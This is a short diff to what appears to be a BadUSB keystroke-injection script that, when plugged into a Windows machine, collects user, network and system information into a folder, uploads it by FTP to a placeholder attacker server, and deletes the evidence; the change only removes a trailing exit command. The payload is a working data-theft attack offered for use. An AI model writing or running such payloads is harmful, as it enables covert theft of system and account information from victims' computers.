@@ -10,5 +10,3 @@ DELAY 200
 STRING mkdir C:\Exfil && whoami /all > C:\Exfil\whoami.txt & ipconfig /all >C:\Exfil\ip.txt & systeminfo > C:\Exfil\systeminfo.txt && ftp [Your FTP Server] && ftp put C:\Exfil\*txt  && ftp bye & rmdir /Q /S C:\Exfil && exit
 ENTER
 REM Executing this all at once allows the computer to work its way through the commands and no longer requires you timing the operation
-STRING exit
-ENTER
